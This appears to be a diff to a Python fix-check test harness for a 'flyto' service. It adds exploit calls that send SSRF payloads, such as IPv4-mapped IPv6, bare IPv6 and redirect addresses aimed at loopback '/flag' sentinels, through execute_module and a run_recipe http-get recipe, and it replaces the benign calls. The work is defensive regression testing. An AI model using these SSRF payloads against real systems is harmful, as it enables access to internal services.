@@ -19,9 +19,16 @@ vulnerable_service builds 2.26.2 (pre-fix for all five). patched_service builds 
 first-fixing version; server_patched_service builds the server's shipped 2.28.0 when it postdates
 that fix, and is None for CVE-2026-73530 (first fixed at 2.28.0 itself). Both patched arms postdate
 each flaw's fix, so patched_surfaces is false for all five and server_patched_surfaces is false for
-the four earlier flaws, null for 73530. The benign calls are the dossier's: a legitimate fetch of
-the loopback sentinel (or the benign seeded recipe) that answers without error on the patched
-server.
+the four earlier flaws, null for 73530.
+
+The four internal_fetch flaws each count one tool, run_recipe, which reaches the same http.get
+sink through the shipped http-get recipe (recipes/http-get.yaml, whose http.get step fetches the
+url argument). A run_recipe exploit written at assembly reaches each flaw's address through that
+recipe beside the execute_module exploit; run_recipe's response carries step statuses and output
+paths, not the fetched body, so it is aimed but does not itself surface the witness, which the
+execute_module exploit beside it surfaces. The benign calls run in-process and answer without
+error on every patched version: string.uppercase through execute_module and the shipped
+json-to-csv recipe through run_recipe, the counted tool's call.
 """
 
 import re
@@ -82,6 +89,43 @@ def _run_recipe(recipe_name: str) -> FixCheckExploit:
         await client.call_tool("run_recipe", {"recipe_name": recipe_name, "args": {}})
 
     return run
+
+
+def _run_recipe_fetch(url: str) -> FixCheckExploit:
+    # run_recipe reaches the internal_fetch sink through the shipped http-get recipe, whose
+    # http.get step fetches the url argument (recipes/http-get.yaml, present on every version).
+    # Its response carries step statuses and output paths, not the fetched body, so this exploit
+    # is aimed (its url carries the flaw's address) but does not itself surface the witness: the
+    # execute_module exploit beside it is the one the fix check reads the reach through.
+    async def run(places: Places, client: KitClient) -> None:
+        await client.call_tool(
+            "run_recipe",
+            {"recipe_name": "http-get", "args": {"url": url, "output": "/tmp/fetch.json"}},
+        )
+
+    return run
+
+
+async def _uppercase(places: Places, client: KitClient) -> None:
+    # The admission's execute_module call (rule v4): an in-process string module, no fetch.
+    await client.call_tool(
+        "execute_module", {"module_id": "string.uppercase", "params": {"text": "hello"}}
+    )
+
+
+async def _json_to_csv(places: Places, client: KitClient) -> None:
+    # The admission's run_recipe call (rule v4): the recipe the package ships, on the example
+    # data of data.json_to_csv, so no recipe is seeded in any image the run builds.
+    await client.call_tool(
+        "run_recipe",
+        {
+            "recipe_name": "json-to-csv",
+            "args": {
+                "input": '[{"name": "Alice", "age": 30}, {"name": "Bob", "age": 25}]',
+                "output": "/tmp/users.csv",
+            },
+        },
+    )
 
 
 # The flyto SSRF variants whose sentinel the standard planting cannot bind. Each stands a sentinel
@@ -255,8 +299,11 @@ TARGETS: tuple[FixCheckTarget, ...] = (
         witness=_http_place("flyto-787"),
         planting_host=HOST,
         builder=ssrf_env,
-        exploits=(_execute_module("http.get", "http://[::ffff:127.0.0.1]/flag"),),
-        benign_calls=(_execute_module("http.get", "http://localhost/flag"),),
+        exploits=(
+            _execute_module("http.get", "http://[::ffff:127.0.0.1]/flag"),
+            _run_recipe_fetch("http://[::ffff:127.0.0.1]/flag"),
+        ),
+        benign_calls=(_uppercase, _json_to_csv),
         vulnerable_service="flyto-vuln",
         patched_service="flyto-flaw-2.26.3",
         server_patched_service="flyto",
@@ -268,8 +315,11 @@ TARGETS: tuple[FixCheckTarget, ...] = (
         witness=_http_place("flyto-428"),
         planting_host=HOST,
         builder=ssrf_env,
-        exploits=(_execute_module("core.api.http_get", "http://127.0.0.1/flag"),),
-        benign_calls=(_execute_module("core.api.http_get", "http://localhost/flag"),),
+        exploits=(
+            _execute_module("core.api.http_get", "http://127.0.0.1/flag"),
+            _run_recipe_fetch("http://127.0.0.1/flag"),
+        ),
+        benign_calls=(_uppercase, _json_to_csv),
         vulnerable_service="flyto-vuln",
         patched_service="flyto-flaw-2.26.7",
         server_patched_service="flyto",
@@ -281,8 +331,11 @@ TARGETS: tuple[FixCheckTarget, ...] = (
         witness=_http_place("flyto-424"),
         planting_host=HOST,
         builder=redirect_ssrf_env,
-        exploits=(_execute_module("http.get", "http://localhost:8080/r"),),
-        benign_calls=(_execute_module("http.get", "http://localhost/flag"),),
+        exploits=(
+            _execute_module("http.get", "http://localhost:8080/r"),
+            _run_recipe_fetch("http://localhost:8080/r"),
+        ),
+        benign_calls=(_uppercase, _json_to_csv),
         vulnerable_service="flyto-vuln",
         patched_service="flyto-flaw-2.26.7",
         server_patched_service="flyto",
@@ -294,8 +347,11 @@ TARGETS: tuple[FixCheckTarget, ...] = (
         witness=_http_place("flyto-530"),
         planting_host=HOST,
         builder=ipv6_loopback_env,
-        exploits=(_execute_module("http.get", "http://[::]/flag"),),
-        benign_calls=(_execute_module("http.get", "http://localhost/flag"),),
+        exploits=(
+            _execute_module("http.get", "http://[::]/flag"),
+            _run_recipe_fetch("http://[::]/flag"),
+        ),
+        benign_calls=(_uppercase, _json_to_csv),
         vulnerable_service="flyto-vuln",
         patched_service="flyto",
         server_patched_service=None,
@@ -308,7 +364,7 @@ TARGETS: tuple[FixCheckTarget, ...] = (
         planting_host=HOST,
         builder=command_injection_env,
         exploits=(_run_recipe("nb08leak2"),),
-        benign_calls=(_run_recipe("nb08benign"),),
+        benign_calls=(_json_to_csv,),
         vulnerable_service="flyto-vuln",
         patched_service="flyto-flaw-2.26.7",
         server_patched_service="flyto",
